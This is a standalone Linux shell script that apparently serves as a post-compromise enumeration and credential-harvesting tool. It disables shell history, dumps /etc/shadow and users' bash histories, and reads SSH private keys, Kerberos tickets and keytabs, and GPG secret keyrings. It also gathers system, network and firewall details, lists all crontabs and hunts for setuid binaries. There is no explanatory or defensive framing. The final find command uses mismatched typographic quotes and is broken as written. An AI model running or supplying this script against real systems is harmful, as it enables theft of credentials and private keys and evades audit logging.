export HISTFILE=

echo "==== Reading some basic interesting files ===="
for f in /etc/resolv.conf /etc/passwd /etc/shadow /etc/issue /etc/motd /home/*/.bash_history; do echo "=== Reading $f ==="; cat $f 2>&1; done

echo "==== Gathering system information ===="
for c in "uname -a" "ps aux" "top -n 1 -d" id arch "uname -m" w "who -a" lspci lsusb lscpu mount lastlog dmesg "cat /proc/cpuinfo" "cat /proc/meminfo"; do echo "=== Running $c ==="; /bin/sh -c "$c 2>&1"; done

echo "==== Gathering network information ===="
for c in "hostname -f" "ip addr show" "ip ro show" "ifconfig -a" "route -n" "cat /etc/network/interfaces" "ip6tables -L -n -v" "iptables -L -n -v" "iptables -t nat -L -n -v" "netstat -anop" "netstat -r" "netstat -nltupw" "arp -a" "lsof -nPi"; do echo "=== Running $c ==="; /bin/sh -c "$c 2>&1"; done

echo "==== Reading key files ===="
for f in /home/*/.ssh/id* /tmp/krb5cc_* /tmp/krb5.keytab /home/*/.gnupg/secring.gpgs; do echo "=== Reading $f ==="; cat $f 2>&1; done

echo "==== Reading config files ===="
for f in /etc/issue /etc/group /etc/hosts /etc/crontab /etc/sysctl.conf /etc/fstab; do echo "=== Reading $f ==="; cat $f 2>&1; done

echo "==== Reading user crontab files ===="
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done

echo "==== Finding setuid files ===="
find /sbin /usr/sbin /opt /lib `echo $PATH | ‘sed s/:/ /g’` -perm /6000 -ls

